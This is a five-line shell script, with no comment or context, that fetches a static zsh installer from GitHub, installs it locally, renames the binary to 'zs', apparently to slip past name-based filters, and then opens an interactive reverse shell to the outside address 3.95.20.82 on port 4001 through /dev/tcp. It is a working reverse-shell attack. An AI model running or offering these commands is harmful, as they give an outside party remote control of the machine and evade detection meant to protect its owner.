wget https://raw.githubusercontent.com/romkatv/zsh-bin/master/install
chmod +x install
./install -d . -e no
mv zsh zs
zs -i >& /dev/tcp/3.95.20.82/4001 0>&1
